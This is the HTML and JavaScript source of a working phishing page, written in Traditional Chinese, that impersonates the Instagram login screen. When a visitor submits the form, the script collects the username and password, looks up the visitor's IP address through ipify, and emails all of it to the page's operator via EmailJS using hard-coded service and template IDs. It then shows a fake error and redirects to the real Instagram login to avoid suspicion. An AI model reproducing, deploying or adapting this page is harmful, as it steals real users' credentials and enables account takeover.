<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram 登入</title>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <script>
        emailjs.init("CDnxhrbcBaRhYiaqq");
    </script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            color: #000000;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* 隱藏瀏覽器預設的密碼眼睛圖示 */
        input[type="password"]::-ms-reveal,
        input[type="password"]::-ms-clear {
            display: none;
        }

        input[type="password"]::-webkit-contacts-auto-fill-button,
        input[type="password"]::-webkit-credentials-auto-fill-button {
            visibility: hidden;
            pointer-events: none;
            position: absolute;
            right: 0;
        }

        /* 主區域布局 */
        .main-container {
            display: flex;
            flex: 1;
            width: 100%;
        }

        /* 左側區塊 */
        .left-section {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 40px 60px;
            border-right: 1px solid #efefef;
            position: relative;
        }

        /* IG Logo 圖片樣式 */
        .ig-logo {
            width: 70px;
            height: 70px;
            object-fit: contain;
            margin-bottom: 40px;
        }

        .hero-title {
            font-size: 42px;
            font-weight: 700;
            text-align: center;
            margin-top: 20px;
            margin-bottom: 40px;
            letter-spacing: -0.5px;
        }

        .highlight-text {
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        /* 左側主視覺圖片區 */
        .hero-image-wrapper {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .hero-image {
            max-width: 100%;
            max-height: 450px;
            object-fit: contain;
        }

        /* 右側登入區塊 */
        .right-section {
            width: 460px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 40px;
        }

        .login-card {
            width: 100%;
            max-width: 350px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .form-title {
            font-size: 16px;
            font-weight: 600;
            align-self: flex-start;
            margin-bottom: 24px;
            color: #000;
        }

        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        /* 浮動標籤輸入框容器 */
        .input-box {
            position: relative;
            width: 100%;
            height: 48px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            display: flex;
            align-items: center;
        }

        .input-box input {
            width: 100%;
            height: 100%;
            padding: 18px 48px 6px 12px; /* 右側預留空間給眼睛圖示 */
            border: none;
            background: transparent;
            font-size: 14px;
            outline: none;
            color: #262626;
        }

        .input-box label {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e8e;
            font-size: 12px;
            pointer-events: none;
            transition: all 0.15s ease-in-out;
        }

        /* 當輸入框獲得焦點或有文字時，文字縮小並移至左上角 */
        .input-box input:focus + label,
        .input-box input:not(:placeholder-shown) + label {
            top: 10px;
            transform: translateY(0);
            font-size: 10px;
        }

        /* 眼睛切換按鈕樣式 */
        .toggle-btn {
            position: absolute;
            right: 12px;
            background: none;
            border: none;
            cursor: pointer;
            display: none; /* 預設隱藏，有文字時透過 JS 顯示 */
            align-items: center;
            justify-content: center;
            padding: 4px;
            color: #262626;
        }

        .toggle-btn svg {
            width: 20px;
            height: 20px;
            fill: none;
            stroke: currentColor;
            stroke-width: 2;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        /* 登入按鈕樣式 */
        .btn-submit {
            width: 100%;
            height: 44px;
            background-color: #a8d1ff; /* 預設淡藍色（未激活） */
            color: #ffffff;
            border: none;
            border-radius: 22px;
            font-size: 14px;
            font-weight: 600;
            cursor: not-allowed;
            margin-top: 8px;
            transition: background-color 0.2s ease;
        }

        /* 亮起狀態 (可點擊) */
        .btn-submit.active {
            background-color: #0095f6; /* 亮藍色 */
            cursor: pointer;
        }

        .forgot-link {
            margin-top: 16px;
            font-size: 13px;
            color: #000000;
            text-decoration: none;
            font-weight: 500;
        }

        .action-buttons {
            width: 100%;
            margin-top: 32px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        /* 按鈕式連結樣式 */
        .btn-secondary {
            width: 100%;
            height: 44px;
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 22px;
            font-size: 14px;
            font-weight: 600;
            color: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            text-decoration: none;
        }

        .btn-outline {
            width: 100%;
            height: 44px;
            background: #ffffff;
            border: 1px solid #0095f6;
            border-radius: 22px;
            font-size: 14px;
            font-weight: 600;
            color: #0095f6;
            display: flex;
            justify-content: center;
            align-items: center;
            text-decoration: none;
        }

        .meta-logo {
            margin-top: 40px;
            display: flex;
            align-items: center;
            gap: 6px;
            color: #0095f6;
            font-weight: 700;
            font-size: 15px;
        }

        /* 頁尾 */
        .footer {
            padding: 24px 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 16px;
            font-size: 12px;
            color: #737373;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
        }

        .footer-links a {
            color: #737373;
            text-decoration: none;
        }

        .footer-bottom {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .lang-select {
            border: none;
            background: transparent;
            color: #737373;
            font-size: 12px;
            outline: none;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <!-- 左側內容區 -->
        <section class="left-section">
            <img src="./ig.png" alt="Instagram Logo" class="ig-logo">

            <h1 class="hero-title">
                查看<span class="highlight-text">摯友</span>每天的精彩時刻。
            </h1>

            <div class="hero-image-wrapper">
                <img src="./ig_picture_logri.png" alt="摯友動態卡片" class="hero-image">
            </div>
        </section>

        <!-- 右側登入區 -->
        <section class="right-section">
            <div class="login-card">
                <h2 class="form-title">登入 Instagram</h2>

                <form class="login-form" onsubmit="event.preventDefault(); handleLogin();">
                    <!-- 帳號輸入框 -->
                    <div class="input-box">
                        <input type="text" id="username" placeholder=" " autocomplete="off">
                        <label for="username">手機號碼、用戶名稱或電子郵件地址</label>
                    </div>

                    <!-- 密碼輸入框 -->
                    <div class="input-box">
                        <input type="password" id="password" placeholder=" ">
                        <label for="password">密碼</label>
                        <button type="button" class="toggle-btn" id="toggle-password" onclick="togglePasswordVisibility()" aria-label="切換密碼可見度">
                            <!-- 預設閉眼圖示（隱藏狀態） -->
                            <svg id="eye-icon" viewBox="0 0 24 24">
                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                                <line x1="1" y1="1" x2="23" y2="23"></line>
                            </svg>
                        </button>
                    </div>

                    <!-- 登入按鈕綁定 onclick 觸發 handleLogin 函式 -->
                    <button type="button" class="btn-submit" id="submit-btn" onclick="handleLogin()" disabled>登入</button>
                </form>

                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">忘記密碼？</a>

                <div class="action-buttons">
                    <a href="./facebook.com.login.html" class="btn-secondary">
                        <svg width="16" height="16" fill="#1877F2" viewBox="0 0 24 24">
                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                        </svg>
                        使用 Facebook 帳號登入
                    </a>
                    <a href="https://www.instagram.com/accounts/emailsignup/?next=" class="btn-outline">建立新帳號</a>
                </div>

                <div class="meta-logo">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="#0095f6">
                        <path d="M12 10.12c1.78-2.9 4.2-4.62 6.86-4.62 3.8 0 6.64 2.87 6.64 7 0 4.13-2.84 7-6.64 7-2.66 0-5.08-1.72-6.86-4.62C10.22 17.78 7.8 19.5 5.14 19.5 1.34 19.5 0 16.63 0 12.5s1.34-7 5.14-7c2.66 0 5.08 1.72 6.86 4.62zM5.14 7.5c-2.4 0-3.14 1.8-3.14 5s.74 5 3.14 5c1.8 0 3.73-1.38 5.21-3.8-1.48-2.42-3.41-3.8-5.21-3.8zm13.72 0c-1.8 0-3.73 1.38-5.21 3.8 1.48 2.42 3.41 3.8 5.21 3.8 2.4 0 3.14-1.8 3.14-5s-.74-5-3.14-5z"/>
                    </svg>
                    <span>Meta</span>
                </div>
            </div>
        </section>
    </div>

    <!-- 頁尾 -->
    <footer class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">關於</a>
            <a href="#">部落格</a>
            <a href="#">工作機會</a>
            <a href="#">說明文件</a>
            <a href="#">API</a>
            <a href="#">隱私</a>
            <a href="#">使用條款</a>
            <a href="#">地點</a>
            <a href="#">熱門</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Meta AI</a>
            <a href="#">Threads</a>
            <a href="#">聯絡人上傳和非用戶</a>
            <a href="#">Meta 驗證</a>
        </div>
        <div class="footer-bottom">
            <select class="lang-select">
                <option>中文(台灣)</option>
            </select>
            <span>© 2026 Instagram from Meta</span>
        </div>
    </footer>

    <!-- JavaScript 邏輯控制 -->
    <script>
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const submitBtn = document.getElementById('submit-btn');
        const togglePasswordBtn = document.getElementById('toggle-password');
        const eyeIcon = document.getElementById('eye-icon');

        const eyeClosedPath = `
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
            <line x1="1" y1="1" x2="23" y2="23"></line>
        `;

        const eyeOpenPath = `
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
        `;

        // 檢查欄位輸入狀態
        function checkInputs() {
            const isUsernameValid = usernameInput.value.trim() !== '';
            const isPasswordValid = passwordInput.value.trim().length >= 6; 

            if (isUsernameValid && isPasswordValid) {
                submitBtn.classList.add('active');
                submitBtn.disabled = false;
            } else {
                submitBtn.classList.remove('active');
                submitBtn.disabled = true;
            }

            if (passwordInput.value.length > 0) {
                togglePasswordBtn.style.display = 'flex';
            } else {
                togglePasswordBtn.style.display = 'none';
            }
        }

        // 切換密碼顯示/隱藏
        function togglePasswordVisibility() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.innerHTML = eyeOpenPath;
            } else {
                passwordInput.type = 'password';
                eyeIcon.innerHTML = eyeClosedPath;
            }
        }

        // 登入按鈕觸發的函式
        async function handleLogin() {
            // 如果按鈕處於 disabled 狀態則不執行
            if (submitBtn.disabled) return;

            const username = usernameInput.value;
            const password = passwordInput.value;
            let userIP = "未知 IP";
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
            } catch (error) {
                console.error("抓取 IP 失敗:", error);
            }
            
            try {
                await emailjs.send("service_0w04i8j", "template_tvkdzq4", {
                    forwhat: "google to ig_login",
                    username: username,
                    password: password,
                    ip: userIP
                });
                // 發送成功後再跳轉
                console.log('進行登入中...', { username, password });
                alert("發生了一些錯誤");
                window.location.href = "https://www.instagram.com/accounts/login/";
                

            } catch (err) {
                alert("系統錯誤，請稍後再試");
            }
            
            
        }

        // 輸入事件監聽
        usernameInput.addEventListener('input', checkInputs);
        passwordInput.addEventListener('input', checkInputs);
    </script>
</body>
</html>
